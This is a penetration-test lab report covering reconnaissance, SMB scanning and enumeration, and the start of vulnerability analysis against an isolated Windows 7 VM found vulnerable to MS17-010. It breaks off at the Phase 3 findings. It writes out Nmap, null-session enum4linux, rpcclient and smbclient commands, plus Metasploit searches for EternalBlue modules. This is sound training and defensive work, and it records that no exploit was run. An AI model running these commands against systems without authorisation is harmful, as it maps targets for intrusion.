# Phase 1 --- Reconnaissance Report

## Windows 7 VirtualBox Lab

**Assessment date:** 23 November 2026\
**Assessment phase:** Phase 1 --- Reconnaissance\
**Attacker VM:** Kali Linux\
**Target VM:** Windows 7\
**Network type:** VirtualBox Host-Only (isolated lab)\
**Assessment scope:** Authorized testing of VMs owned and controlled by
the lab operator

---

## 1. Executive Summary

Phase 1 reconnaissance was completed after resolving an initial
VirtualBox network configuration problem. The final connectivity test
confirmed that the Windows 7 target at `192.168.56.103` was reachable
from Kali Linux at `192.168.56.102`.

The Nmap host-discovery sweep of `192.168.56.0/24` reported three hosts
up: `192.168.56.1`, `192.168.56.100`, and `192.168.56.102`. The Windows
7 target (`192.168.56.103`) was not listed in that sweep output, but a
later direct ICMP test received all four replies, and the ARP table
subsequently contained the target's MAC address.

**Overall result:** Basic network discovery and target connectivity were
established. Port scanning and vulnerability enumeration have not yet
been performed; those activities belong to later phases.

## 2. Scope and Environment

Item Recorded value

---

Attacker Kali Linux
Attacker interface `eth0`
Attacker IPv4 address `192.168.56.102`
Target Windows 7 VM
Target IPv4 address at final test `192.168.56.103`
Network `192.168.56.0/24`
Virtualization platform Oracle VirtualBox
Intended isolation Host-Only network

Only the lab VMs and the isolated lab network are in scope. No external
systems were tested.

## 3. Methodology and Commands

The following Phase 1 activities were performed:

### 3.1 Nmap host-discovery sweep

```bash
nmap -sn 192.168.56.0/24 -oN 01-ping-sweep.txt
```

This performed host discovery across the `/24` subnet and saved
normal-format output to `01-ping-sweep.txt`.

### 3.2 Direct connectivity test to Windows 7

```bash
ping -c 4 192.168.56.103 | tee 02-ping-win7.txt
```

This sent four ICMP echo requests to the target and displayed and saved
the output.

### 3.3 ARP table inspection

```bash
arp -a | tee 03-arp-table.txt
```

This displayed the local ARP cache and saved the output.

## 4. Results

### 4.1 Nmap host-discovery sweep

**Evidence file:** `01-ping-sweep.txt`

- Scan range: `192.168.56.0/24`
- Nmap version: `7.99`
- Scan type: host discovery (`-sn`)
- Hosts reported up: **3**
- Total addresses scanned: **256**
- Duration: approximately **2.01 seconds**

Hosts reported by Nmap:

IP address Nmap observation MAC address

---

`192.168.56.1` Host is up `0A:00:27:00:00:09`
`192.168.56.100` Host is up `08:00:27:1B:12:61`
`192.168.56.102` Host is up Not shown

Nmap identified the MAC address for `192.168.56.100` as an Oracle
VirtualBox virtual NIC. The scan output did **not** list
`192.168.56.103`.

### 4.2 Direct ping test to Windows 7

**Evidence file:** `02-ping-win7.txt`

The later direct ping test to `192.168.56.103` succeeded:

Metric Result

---

Packets transmitted 4
Packets received 4
Packet loss **0%**
Minimum RTT 1.100 ms
Average RTT 1.959 ms
Maximum RTT 4.379 ms
Observed TTL 128

This confirms that the target responded to ICMP echo requests during the
recorded test.

### 4.3 ARP table

**Evidence file:** `03-arp-table.txt`

The ARP table contained these entries:

IP address MAC address Interface

---

`192.168.56.1` `0A:00:27:00:00:09` `eth0`
`192.168.56.103` `08:00:27:51:1A:A4` `eth0`

The ARP entry for `192.168.56.103` provides a layer-2 address associated
with the Windows 7 target during the later connectivity test.

## 5. Troubleshooting and Issues Encountered

Several connectivity issues occurred before the successful test. They
are included here as part of the assessment record.

### 5.1 Initial subnet mismatch

The first Windows 7 `ipconfig` output showed:

- Windows 7: `192.168.0.219/24`
- Kali Linux: `192.168.56.102/24`

These addresses were on different IPv4 subnets. The first Kali ping
attempt returned:

```text
ping: connect: Network is unreachable
```

This indicated that Kali did not have a route to the target network.

**Resolution:** The VirtualBox networking was adjusted so that both VMs
used the same Host-Only lab network. Windows 7 was subsequently tested
at `192.168.56.103`.

### 5.2 Initial ping failure after subnet alignment

After using the `192.168.56.x` lab subnet, the first ping attempt to
`192.168.56.103` showed:

```text
4 packets transmitted, 0 received, 100% packet loss
```

At this point, Windows Firewall had not yet been turned off during the
initial troubleshooting. Firewall filtering was considered as a possible
reason for the lack of ICMP replies.

**Troubleshooting action:** Windows Firewall settings were reviewed, and
the options of disabling the firewall in the isolated lab or enabling
the inbound ICMPv4 Echo Request rule were discussed. A later ping test
succeeded.

**Evidence limitation:** The uploaded evidence confirms the later
successful ping, but it does not record whether the firewall was fully
disabled or whether only the ICMP Echo Request rule was enabled. The
exact final firewall state should therefore be verified and recorded
before the next phase.

### 5.3 Nmap sweep and direct ping discrepancy

The Nmap sweep listed three active hosts but did not list
`192.168.56.103`. The later direct ping and ARP output did identify and
communicate with `192.168.56.103`.

This difference is recorded as an observation. The available evidence
does not establish why the target was absent from the earlier sweep;
timing, host availability, or host filtering may be investigated if the
sweep is repeated.

### 5.4 VirtualBox clipboard issue

A copy-and-paste problem was also encountered while working with the
VMs. VirtualBox Shared Clipboard set to Bidirectional and Guest
Additions were discussed as troubleshooting steps. This was a usability
issue and did not change the network test results.

## 6. Findings

### Finding 1 --- Initial network configuration mismatch

**Status:** Resolved\
**Impact on assessment:** Prevented initial connectivity from Kali to
Windows 7.

Kali and Windows 7 initially used different IPv4 subnets
(`192.168.56.0/24` and `192.168.0.0/24`). Kali returned
`Network is unreachable` when attempting to contact the original Windows
address.

**Resolution:** Both VMs were moved to the same Host-Only lab subnet,
and the target was later tested at `192.168.56.103`.

### Finding 2 --- Initial ICMP test received no replies

**Status:** Later connectivity confirmed; firewall state not
conclusively documented\
**Impact on assessment:** Delayed confirmation that the target was
reachable.

The first ping to `192.168.56.103` received no replies. Windows Firewall
had not yet been turned off at the first troubleshooting point, so
firewall filtering was considered. The later evidence shows four
successful replies and 0% packet loss.

**Recommendation:** Before further testing, record the Windows Firewall
profile and state. Prefer enabling only the required inbound ICMPv4 Echo
Request rule rather than disabling the firewall entirely.

### Finding 3 --- Windows 7 target reachable on the lab subnet

**Status:** Confirmed

The direct ping test received four out of four replies from
`192.168.56.103`. The ARP table also recorded the target's MAC address
as `08:00:27:51:1A:A4`.

**Impact:** Basic layer-3 reachability and local layer-2 neighbor
resolution were confirmed at the time of testing.

## 7. Evidence Inventory

The following raw evidence files were supplied for this report:

---

Evidence file Description

---

`01-ping-sweep.txt` Nmap host-discovery results for
`192.168.56.0/24`

`02-ping-win7.txt` Successful four-packet ping test to
`192.168.56.103`

`03-arp-table.txt` ARP entries for `192.168.56.1` and
`192.168.56.103`

---

Keep these original evidence files unchanged alongside this report.

## 8. Limitations

- The Nmap activity performed so far was host discovery only (`-sn`);
  it did not identify open TCP or UDP ports.
- No service/version detection, OS fingerprinting, SMB enumeration, or
  vulnerability scripts were run as part of this phase.
- The Nmap sweep output did not list the target IP, even though the
  later direct ping and ARP evidence did.
- The final Windows Firewall state was not captured in the supplied
  evidence.
- The initial Windows `ipconfig` screenshot showed `192.168.0.219`;
  the later target address `192.168.56.103` is supported by the ping
  and ARP evidence.

## 9. Recommendations and Next Steps

1.  Keep both VMs on the same isolated VirtualBox Host-Only or Internal
    Network.
2.  Verify and record the current IP configuration on both VMs before
    each test session.
3.  Keep Windows Firewall enabled where possible and allow only the
    specific lab traffic required, such as ICMPv4 Echo Request.
4.  Repeat the Nmap host-discovery sweep and confirm whether
    `192.168.56.103` appears.
5.  Proceed to Phase 2 --- Scanning and Enumeration only after
    confirming the target IP and lab isolation.
6.  Save all Phase 2 command output in the `02-scanning/` directory and
    preserve the original evidence.

## 10. Conclusion

Phase 1 established successful communication between Kali Linux
(`192.168.56.102`) and the Windows 7 target (`192.168.56.103`) in the
`192.168.56.0/24` lab network. The final direct ping test achieved 0%
packet loss, and the ARP table recorded the target's MAC address.

The assessment experienced an initial subnet mismatch and a subsequent
ping failure during firewall/network troubleshooting. These issues and
the discrepancy between the Nmap sweep and later direct ping have been
documented. Phase 1 is complete for basic connectivity and
reconnaissance; detailed port and vulnerability assessment remains for
Phase 2 and later phases.

# Phase 2 --- Scanning & Enumeration Report

**Assessment date:** 23 November 2026\
**Assessment phase:** Phase 2 --- Scanning & Enumeration\
**Assessment type:** Authorized, isolated Windows 7 virtual-machine lab\
**Scanner:** Kali Linux, Nmap 7.99\
**Target:** Windows 7 virtual machine --- `192.168.56.103`

---

## 1. Executive Summary

Phase 2 assessed the exposed TCP services and SMB configuration of the
Windows 7 lab target at `192.168.56.103`.

The full TCP scan identified **nine open TCP ports**: 135, 139, 445, and
49152--49157. Service detection and SMB OS discovery identified the
target as **Windows 7 Ultimate, build 7601, Service Pack 1**, with
computer name `Windows7` and workgroup `WORKGROUP`.

The most significant result was the Nmap `smb-vuln-ms17-010` check,
which reported the target as **VULNERABLE** and assigned a **HIGH** risk
factor. The script specifically listed **CVE-2017-0143**. The SMB
protocol enumeration also confirmed that the target advertises
**SMBv1**, in addition to SMB 2.0.2 and SMB 2.1.

Anonymous SMB session establishment was accepted by the tools used, but
the tested anonymous user and RPC enumeration operations were denied.
The share-enumeration attempts did not return a complete share listing.
The MS08-067 check did not return a vulnerability finding; this is
recorded as **not detected by that scan**, not as proof that the target
is unaffected.

**No exploitation was performed in Phase 2.** The results below are
based on the supplied scan outputs and terminal evidence.

## 2. Assessment Scope and Environment

Item Observed value

---

Attacker VM Kali Linux
Attacker IPv4 address `192.168.56.102`
Target VM Windows 7
Target IPv4 address `192.168.56.103`
Target computer name `Windows7`
Target NetBIOS name `WINDOWS7`
Workgroup `WORKGROUP`
Target MAC address `08:00:27:51:1A:A4`
Identified operating system Windows 7 Ultimate SP1, build 7601
Lab network `192.168.56.0/24`
Nmap version 7.99
enum4linux version 0.9.1

The assessment scope was the Windows 7 virtual machine at
`192.168.56.103` on the isolated lab network. No other systems were
included.

## 3. Methodology

The following activities were performed:

1.  Full TCP port discovery.
2.  Service and version detection.
3.  OS fingerprinting.
4.  SMB OS discovery.
5.  SMB share and user enumeration.
6.  MS17-010 vulnerability detection.
7.  MS08-067 vulnerability detection.
8.  Anonymous/null-session enumeration with enum4linux.
9.  RPC enumeration with rpcclient.
10. SMB share listing with smbclient.
11. SMB protocol dialect detection.

Commands and results are documented individually below. Commands are
shown in the form used for the assessment, including their output
filenames where applicable.

---

## 4. Detailed Results

### 4.1 Full TCP Port Scan

**Command executed**

```bash
sudo nmap -p- -T4 192.168.56.103 -oN full-tcp-01.txt
```

**Purpose:** Scan all TCP ports on the target and save the results in
normal Nmap text format.

**Observed result:**

- Target status: Host is up.
- Open TCP ports: 9.
- Closed TCP ports: 65,526.
- Scan duration: approximately 39.63 seconds.
- MAC address: `08:00:27:51:1A:A4` (Oracle VirtualBox virtual NIC).

         Port State   Service reported by Nmap

---

      `135/tcp` Open    `msrpc`
      `139/tcp` Open    `netbios-ssn`
      `445/tcp` Open    `microsoft-ds`
    `49152/tcp` Open    Unknown during initial scan
    `49153/tcp` Open    Unknown during initial scan
    `49154/tcp` Open    Unknown during initial scan
    `49155/tcp` Open    Unknown during initial scan
    `49156/tcp` Open    Unknown during initial scan
    `49157/tcp` Open    Unknown during initial scan

**Assessment note:** TCP ports 135, 139, and 445 expose Windows RPC,
NetBIOS session service, and SMB respectively. The six high-numbered
ports were later identified as Microsoft Windows RPC. Port 3389 was not
listed as open in this full TCP scan.

**Evidence:** `full-tcp-01.txt`

### 4.2 Service and Version Detection

**Command executed**

```bash
sudo nmap -sV -sC -p 135,139,445,49152-49157 192.168.56.103 -oN service-scan-02.txt
```

**Purpose:** Identify services and versions on the discovered ports and
run Nmap's default scripts.

**Observed result:**

           Port Detected service/version

---

      `135/tcp` Microsoft Windows RPC
      `139/tcp` Microsoft Windows NetBIOS session service
      `445/tcp` Windows 7 Ultimate 7601 Service Pack 1, `microsoft-ds`
    `49152/tcp` Microsoft Windows RPC
    `49153/tcp` Microsoft Windows RPC
    `49154/tcp` Microsoft Windows RPC
    `49155/tcp` Microsoft Windows RPC
    `49156/tcp` Microsoft Windows RPC
    `49157/tcp` Microsoft Windows RPC

Additional script results:

- Hostname: `WINDOWS7`.
- Workgroup: `WORKGROUP`.
- SMB2 security-mode script, dialect 2.1: **message signing enabled
  but not required**.
- A separate SMB security-mode script reported `account_used: guest`,
  `authentication_level: user`, challenge-response support, and
  `message_signing: disabled`.
- SMB OS discovery within this scan identified Windows 7 Ultimate 7601
  Service Pack 1.
- The Nmap clock-skew script reported a mean of approximately `-2h`.

**Assessment note:** The two message-signing observations are preserved
as reported by the separate Nmap scripts. They should not be combined
into a single definitive configuration statement without checking the
effective SMB1 and SMB2 signing settings on the Windows host.

**Evidence:** `service-scan-02.txt`

### 4.3 OS Detection

**Command executed**

```bash
sudo nmap -O 192.168.56.103 -oN os-detection-03.txt
```

**Purpose:** Use TCP/IP fingerprinting to estimate the target operating
system.

**Observed result:**

Nmap reported:

- Device type: General purpose.
- Running: Microsoft Windows 2008, Windows 7, Vista, or Windows 8.1.
- OS details: Windows Vista SP2 or Windows 7 or Windows Server 2008 R2
  or Windows 8.1.
- Network distance: 1 hop.

**Assessment note:** The OS fingerprint did not uniquely identify the
exact Windows version. The more specific SMB OS discovery and
service-detection results identified Windows 7 Ultimate SP1, build 7601.

**Evidence:** `os-detection-03.txt`

### 4.4 SMB OS Discovery

**Command executed**

```bash
sudo nmap -p445 --script smb-os-discovery 192.168.56.103 -oN smb-os-04.txt
```

**Purpose:** Retrieve operating-system and host information exposed
through SMB.

**Observed result:**

Field Result

---

Operating system Windows 7 Ultimate
Build `7601`
Service Pack `1`
Computer name `Windows7`
NetBIOS computer name `WINDOWS7`
Workgroup `WORKGROUP`
OS CPE `cpe:/o:microsoft:windows_7::sp1`

**Assessment note:** This scan provides the clearest OS identification
in the supplied evidence.

**Evidence:** `smb-os-04.txt`

### 4.5 SMB Share and User Enumeration

**Command executed**

```bash
sudo nmap -p445 --script smb-enum-shares,smb-enum-users 192.168.56.103 -oN smb-enum-05.txt
```

**Purpose:** Attempt to enumerate SMB shares and user accounts.

**Observed result:**

The share-enumeration script reported that enumeration failed with
`NT_STATUS_ACCESS_DENIED` and then attempted common share names.

---

Share Anonymous access Additional result
reported

---

`ADMIN$` None Share details request
returned
`NT_STATUS_ACCESS_DENIED`

`C$` None Share details request
returned
`NT_STATUS_ACCESS_DENIED`

`IPC$` `READ` Share details request
returned
`NT_STATUS_ACCESS_DENIED`

---

No user-account entries were returned in the supplied Nmap output.

**Assessment note:** The `IPC$` `READ` result is the script's reported
access classification; the same output also says that it could not
retrieve share details. This does not demonstrate anonymous access to
files on the Windows system drive. The lack of returned usernames should
be recorded as no accounts discovered by this scan, not as proof that no
accounts exist.

**Evidence:** `smb-enum-05.txt`

### 4.6 MS17-010 Vulnerability Check

**Command executed**

```bash
sudo nmap -p445 --script smb-vuln-ms17-010 192.168.56.103 -oN ms17-010-06.txt
```

**Purpose:** Run Nmap's MS17-010 SMB vulnerability detection script
against TCP port 445.

**Observed result:**

Nmap returned:

```text
smb-vuln-ms17-010:
  VULNERABLE:
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    State: VULNERABLE
    IDs: CVE:CVE-2017-0143
    Risk factor: HIGH
```

Field Result

---

Target `192.168.56.103`
Port `445/tcp`
Service `microsoft-ds`
Nmap script result `VULNERABLE`
CVE explicitly listed by the scan `CVE-2017-0143`
Nmap risk factor `HIGH`
Disclosure date shown `2017-03-14`

**Assessment:** Nmap detected an MS17-010-related remote code execution
vulnerability in the target's Microsoft SMBv1 service.

**Important technical qualification:** This report records the CVE
identifier exactly as shown by the supplied Nmap output:
`CVE-2017-0143`. MS17-010 is a Microsoft security bulletin covering
multiple CVEs. The scan result is evidence of a vulnerability detection
result; it is not evidence that exploitation was attempted or that
remote code execution was achieved.

**Recommended priority:** Treat this as the highest-priority finding
from Phase 2. Verify the Windows patch state, apply the applicable
security update, disable SMBv1 where it is not required, and repeat the
detection scan after remediation.

**Evidence:** `ms17-010-06.txt`

### 4.7 MS08-067 Vulnerability Check

**Command executed**

```bash
sudo nmap -p445 --script smb-vuln-ms08-067 192.168.56.103 -oN ms08-067-07.txt
```

**Purpose:** Run Nmap's MS08-067 vulnerability detection script.

**Observed result:**

- Target status: Host is up.
- Port `445/tcp`: Open.
- The supplied output contains no MS08-067 host-script result and no
  `VULNERABLE` finding.

**Assessment:** MS08-067 was **not detected by this scan**. Because the
script returned no explicit vulnerability status, this result must not
be represented as conclusive proof that the target is unaffected.

**Evidence:** `ms08-067-07.txt`

### 4.8 Anonymous / Null-Session Enumeration

**Command executed**

```bash
enum4linux -a 192.168.56.103 2>&1 | tee enum4linux-08.txt
```

**Tool version:** enum4linux 0.9.1

**Purpose:** Collect NetBIOS, workgroup, session, user, share, and
password-policy information using the available SMB enumeration methods.

**Observed result:**

- Workgroup identified: `WORKGROUP`.
- NetBIOS workstation name: `WINDOWS7`.
- NetBIOS file-server service name: `WINDOWS7`.
- MAC address: `08-00-27-51-1A-A4`.
- The session check reported that the server allows a session using an
  empty username and empty password.
- LSARPC initialization failed with `NT_STATUS_ACCESS_DENIED`.
- The tool could not determine the domain SID.
- OS information retrieval through smbclient failed.
- The SRVSVC request failed with `NT_STATUS_ACCESS_DENIED`.
- User enumeration through `querydispinfo` failed with
  `NT_STATUS_ACCESS_DENIED`.
- User enumeration through `enumdomusers` failed with
  `NT_STATUS_ACCESS_DENIED`.
- Share enumeration returned `NT_STATUS_RESOURCE_NAME_NOT_FOUND`; the
  displayed share table was empty.
- SMB1 workgroup-listing fallback failed with
  `Unable to connect with SMB1 -- no workgroup available`.
- The supplied output shows a password-policy section heading but no
  password-policy values.

**Assessment:** The target accepted the tested anonymous session, but
the tested anonymous user, domain, and RPC enumeration operations were
restricted. No user accounts or complete share list were obtained from
this run.

**Evidence:** `enum4linux-08(1).txt` (uploaded filename; the command's
`tee` destination was `enum4linux-08.txt`).

### 4.9 RPC Enumeration

**Commands executed**

```bash
rpcclient -U "" -N 192.168.56.103 -c 'srvinfo'
```

```bash
rpcclient -U "" -N 192.168.56.103 -c 'enumdomusers'
```

```bash
rpcclient -U "" -N 192.168.56.103 -c 'querydominfo'
```

**Purpose:** Test whether the anonymous session can access server
information, enumerate domain users, and query domain/workgroup
information through RPC.

**Observed result:**

---

RPC operation Observed response

---

`srvinfo` Could not initialise `srvsvc`;
`NT_STATUS_ACCESS_DENIED`

`enumdomusers` Could not initialise `samr`;
`NT_STATUS_ACCESS_DENIED`

`querydominfo` Could not initialise `samr`;
`NT_STATUS_ACCESS_DENIED`

---

**Assessment:** The anonymous RPC requests were denied for all three
tested operations. No user accounts or domain information were returned
by these commands.

**Evidence:** `rpc-enu-09.png` (terminal screenshot). A separate
`rpc-enum-09.txt` text log was not supplied.

### 4.10 SMB Share Listing

**Command executed**

```bash
smbclient -L //192.168.56.103/ -N 2>&1 | tee smb-shares-10.txt
```

**Purpose:** Attempt to list SMB shares without supplying a password.

**Observed result:**

- The output reported `NT_STATUS_RESOURCE_NAME_NOT_FOUND`.
- It also reported `Anonymous login successful`.
- No share entries appeared in the displayed share table.
- The SMB1 workgroup-listing fallback failed with
  `Unable to connect with SMB1 -- no workgroup available`.

**Assessment:** Anonymous login was accepted by smbclient, but a usable
share listing was not obtained. This is an inconclusive
share-enumeration result; it does not prove that the target has no
shares.

**Evidence:** `smb-shares-10.txt`

### 4.11 SMB Protocol Version Detection

**Command executed**

```bash
sudo nmap -p445 --script smb-protocols 192.168.56.103 -oN smb-protocols-11.txt
```

**Purpose:** Identify the SMB protocol dialects advertised by the
target.

**Observed result:**

---

Dialect reported by Nmap Result

---

`NT LM 0.12` (SMBv1) Advertised; Nmap labels it
"dangerous, but default"

`2.0.2` Advertised

`2.1` Advertised

SMB 3.x Not listed in this scan output

---

**Assessment:** SMBv1 is enabled/advertised by the target. SMB 2.0.2 and
SMB 2.1 are also advertised. This is a significant configuration
observation when considered alongside the MS17-010 detection result.

**Evidence:** `smb-protocols-11.txt`

---

## 5. Consolidated Findings Register

---

ID Finding Evidence-based Priority
status

---

F-01 MS17-010 SMB Nmap reported High --- per Nmap
vulnerability `VULNERABLE`;  
 CVE-2017-0143  
 listed

F-02 SMBv1 protocol SMBv1 dialect High-priority
enabled advertised by Nmap remediation

F-03 SMB signing SMB2 signing not Validate and
configuration required; separate remediate
script reports  
 signing disabled

F-04 Anonymous SMB Empty-credential Review
session accepted session accepted; configuration
enumeration was  
 restricted

F-05 Anonymous Tested RPC and Access
RPC/user user-enumeration restriction
enumeration operations denied observed

F-06 Administrative No anonymous Access
share access access reported restriction
for `ADMIN$` and observed
`C$`

F-07 MS08-067 No vulnerability Inconclusive /
result returned by not detected
the supplied scan

---

### F-01 --- MS17-010

Nmap's `smb-vuln-ms17-010` script reported the target as vulnerable and
assigned a HIGH risk factor. This is the most significant result in this
phase. The scan output specifically lists CVE-2017-0143. The finding
should be verified against the target's installed security updates and
then retested after remediation.

### F-02 --- SMBv1 enabled

The SMB protocol script identified the SMBv1 dialect `NT LM 0.12`. SMBv1
is a legacy protocol. Its presence increases exposure to vulnerabilities
affecting SMBv1 implementations and should be reviewed, particularly
given the MS17-010 result.

### F-03 --- SMB signing configuration requires validation

The service scan reported SMB2 message signing as enabled but not
required, while a separate SMB security-mode result reported message
signing disabled. Confirm the effective signing configuration on the
Windows host for the relevant SMB dialects. Do not treat the scan output
as a definitive configuration audit.

### F-04 --- Anonymous session accepted, enumeration restricted

enum4linux and smbclient reported successful anonymous session/login
attempts. However, the tested user enumeration and RPC operations were
denied, and no complete share list was obtained. The evidence
demonstrates anonymous session acceptance, not anonymous access to
sensitive files.

### F-05 and F-06 --- RPC and administrative-share restrictions

The tested anonymous RPC operations returned `NT_STATUS_ACCESS_DENIED`.
Nmap also reported no anonymous access for `ADMIN$` and `C$`. These are
access restrictions observed during the tests.

### F-07 --- MS08-067 not detected

The MS08-067 scan did not return a vulnerability result. The evidence
supports only the statement "not detected by this scan"; it does not
establish that the target is definitively unaffected.

---

## 6. Limitations and Interpretation Notes

1.  The assessment performed TCP scanning. No UDP scan is included in
    the supplied evidence.
2.  Nmap OS fingerprinting returned a broad Windows-family estimate. SMB
    OS discovery provided the more specific Windows 7 Ultimate SP1
    identification.
3.  The MS17-010 result is a vulnerability-script detection result. No
    exploit was run, and no remote code execution was demonstrated.
4.  The MS08-067 script returned no vulnerability result. This is not
    conclusive proof of absence.
5.  Anonymous session acceptance did not result in successful user
    enumeration or a complete share listing.
6.  The `IPC$` `READ` label appeared alongside an error retrieving share
    details. It should not be interpreted as proof of access to system
    files.
7.  The SMB signing observations differ between Nmap scripts and require
    validation on the Windows host.
8.  The RPC evidence was supplied as a screenshot (`rpc-enu-09.png`),
    not as a saved text transcript.
9.  The uploaded enum4linux file has the name `enum4linux-08(1).txt`;
    the command shown in the assessment used `tee enum4linux-08.txt`.
10. Some commands were run from the Kali home directory (`~`). Confirm
    that all original evidence files are stored in the final project
    evidence directory. Preserve the raw outputs unchanged.

## 7. Evidence Inventory

Evidence file supplied Activity

---

`full-tcp-01.txt` Full TCP port scan
`service-scan-02.txt` Service and version detection
`os-detection-03.txt` OS fingerprinting
`smb-os-04.txt` SMB OS discovery
`smb-enum-05.txt` SMB share and user enumeration
`ms17-010-06.txt` MS17-010 vulnerability check
`ms08-067-07.txt` MS08-067 vulnerability check
`enum4linux-08(1).txt` Anonymous/null-session enumeration
`rpc-enu-09.png` RPC enumeration terminal screenshot
`smb-shares-10.txt` Anonymous SMB share listing
`smb-protocols-11.txt` SMB protocol dialect detection

Keep the original evidence files and screenshot unchanged. If a text
transcript is required for RPC enumeration, repeat the same read-only
commands with output redirection or `tee` and label the new file as a
supplementary capture.

## 8. Recommendations

1.  **Keep the target isolated.** Retain the Windows 7 VM on the
    Host-Only or Internal Network. Do not connect this vulnerable VM to
    a bridged or public network.
2.  **Take a VM snapshot.** Preserve the current lab state before any
    further testing or configuration changes.
3.  **Prioritize MS17-010 remediation.** Verify the installed Windows
    updates and apply the applicable security update for the detected
    issue.
4.  **Disable SMBv1 if it is not required.** Verify the resulting SMB
    dialect list after the change.
5.  **Restrict SMB exposure.** Limit inbound TCP port 445 to trusted lab
    systems and review host firewall rules.
6.  **Validate SMB signing.** Confirm the effective SMB1 and SMB2
    signing settings locally and require signing where appropriate for
    the environment.
7.  **Review anonymous access.** Disable unnecessary anonymous SMB
    sessions and restrict anonymous access to shares and RPC interfaces.
8.  **Retest after remediation.** Repeat the relevant SMB protocol and
    vulnerability checks and retain the before-and-after evidence.
9.  **Plan OS replacement for non-lab use.** Windows 7 is an obsolete
    operating system and should not be used as a production system.

---

## 9. Conclusion

Phase 2 identified nine open TCP ports on the Windows 7 target and
confirmed Windows 7 Ultimate SP1, build 7601, through SMB service
detection and SMB OS discovery. The target advertises SMBv1, SMB 2.0.2,
and SMB 2.1.

The principal security concern is the Nmap MS17-010 result, which
reported the SMB service as `VULNERABLE` with a HIGH risk factor and
listed CVE-2017-0143. SMBv1 was also confirmed as an advertised
protocol. Anonymous SMB session establishment was accepted, but the
tested anonymous user and RPC enumeration operations were denied, and a
complete share listing was not obtained. The MS08-067 check returned no
vulnerability finding.

All 11 planned scanning and enumeration activities were attempted. Some
enumeration results were restricted or inconclusive and are recorded as
such. **No exploitation was performed.** Remediation and verification of
the MS17-010/SMBv1 exposure should be prioritized before any further
assessment activity.

---

## Appendix A --- Complete Command List

The following is the consolidated list of commands used during Phase 2.

**1. Full TCP port scan**

```bash
sudo nmap -p- -T4 192.168.56.103 -oN full-tcp-01.txt
```

**2. Service and version detection**

```bash
sudo nmap -sV -sC -p 135,139,445,49152-49157 192.168.56.103 -oN service-scan-02.txt
```

**3. OS detection**

```bash
sudo nmap -O 192.168.56.103 -oN os-detection-03.txt
```

**4. SMB OS discovery**

```bash
sudo nmap -p445 --script smb-os-discovery 192.168.56.103 -oN smb-os-04.txt
```

**5. SMB share and user enumeration**

```bash
sudo nmap -p445 --script smb-enum-shares,smb-enum-users 192.168.56.103 -oN smb-enum-05.txt
```

**6. MS17-010 vulnerability check**

```bash
sudo nmap -p445 --script smb-vuln-ms17-010 192.168.56.103 -oN ms17-010-06.txt
```

**7. MS08-067 vulnerability check**

```bash
sudo nmap -p445 --script smb-vuln-ms08-067 192.168.56.103 -oN ms08-067-07.txt
```

**8. enum4linux anonymous/null-session enumeration**

```bash
enum4linux -a 192.168.56.103 2>&1 | tee enum4linux-08.txt
```

**9. RPC server information**

```bash
rpcclient -U "" -N 192.168.56.103 -c 'srvinfo'
```

**9. RPC domain user enumeration**

```bash
rpcclient -U "" -N 192.168.56.103 -c 'enumdomusers'
```

**9. RPC domain information**

```bash
rpcclient -U "" -N 192.168.56.103 -c 'querydominfo'
```

**10. SMB share listing without a password**

```bash
smbclient -L //192.168.56.103/ -N 2>&1 | tee smb-shares-10.txt
```

**11. SMB protocol dialect detection**

```bash
sudo nmap -p445 --script smb-protocols 192.168.56.103 -oN smb-protocols-11.txt
```

# Phase 3 --- Vulnerability Analysis Report

## 1. Assessment Information

---

Item Details

---

Project Windows 7 Security Assessment Lab

Phase Phase 3 --- Vulnerability Analysis

Assessment date 23 November 2026

Target IP address `192.168.56.103`

Target operating system Windows 7 Ultimate SP1, build 7601
(identified during earlier
enumeration)

Assessment platform Kali Linux

Virtualization Oracle VirtualBox

Primary tools Nmap 7.99, SearchSploit /
Exploit-DB, Metasploit Framework

---

## 2. Executive Summary

Phase 3 assessed the Windows 7 lab host for known vulnerabilities and
reviewed publicly documented exploit references. The assessment focused
on SMB because TCP port 445 was open during earlier enumeration.

The Nmap vulnerability scan reported the target as **VULNERABLE to
MS17-010**, with a **HIGH** risk factor. The script output specifically
identified `CVE-2017-0143`. SearchSploit searches returned
EternalBlue/MS17-010 exploit references relevant to Windows 7, and the
Metasploit search identified three related modules.

The Exploit-DB update process did not complete cleanly: the Kali
repository hostname could not be resolved, and the `exploitdb-papers`
package could not be downloaded. The installed `exploitdb` package was
reported as already being at its newest available local package version
(`20260904-0kali1`), but a successful online update was not verified.

**No exploit was executed and no remote code execution, shell access, or
post-exploitation activity was performed during this phase.** The
findings below distinguish scanner results from exploit-reference
matches.

## 3. Scope and Methodology

The work in this phase was limited to the authorized VirtualBox lab
target `192.168.56.103`. Activities included:

1.  Running Nmap's vulnerability-detection scripts against the target.
2.  Searching the local Exploit-DB database for Windows 7, EternalBlue,
    and MS17-010 references.
3.  Attempting to update the local Exploit-DB database.
4.  Searching Metasploit for Windows exploit modules associated with
    MS17-010.
5.  Saving command output as text evidence for the project record.

The commands below are the commands used or represented by the captured
Phase 3 evidence. The broad Windows 7 SearchSploit lookup is listed as
`searchsploit windows 7`; its captured output is retained as
`searchsploit-windows7-02(1).txt`.

## 4. Commands Executed

### 4.1 Nmap vulnerability scan

```bash
sudo nmap --script vuln 192.168.56.103 -oN vuln-sweep-01.txt
```

Purpose: Run Nmap vulnerability-detection scripts against the target and
save normal-format output to `vuln-sweep-01.txt`.

### 4.2 Broad Windows 7 Exploit-DB search

```bash
searchsploit windows 7
```

Purpose: Search the local Exploit-DB index for entries associated with
Windows 7.

Captured evidence: `searchsploit-windows7-02(1).txt`

### 4.3 Focused EternalBlue search

```bash
searchsploit -t "EternalBlue" | tee eternalblue-03.txt
```

Purpose: Search exploit titles for EternalBlue and display the results
while saving a copy to `eternalblue-03.txt`.

### 4.4 Focused MS17-010 search

```bash
searchsploit -t "MS17-010" | tee ms17-010-04.txt
```

Purpose: Search exploit titles for the MS17-010 bulletin identifier and
save the results to `ms17-010-04.txt`.

### 4.5 Exploit-DB update attempt

```bash
searchsploit -u 2>&1 | tee searchsploit-update-05.txt
```

Purpose: Attempt to update the local SearchSploit / Exploit-DB data and
capture standard output and error output in
`searchsploit-update-05.txt`.

### 4.6 Metasploit module search

```bash
msfconsole -q -x "search type:exploit platform:windows ms17-010; exit" | tee metasploit-ms17-010-06.txt
```

Purpose: Start Metasploit without the banner, search for Windows exploit
modules matching MS17-010, exit, and save the results to
`metasploit-ms17-010-06.txt`.

## 5. Findings

### 5.1 Nmap vulnerability scan

The scan confirmed that the host was reachable and identified the
following open TCP ports:

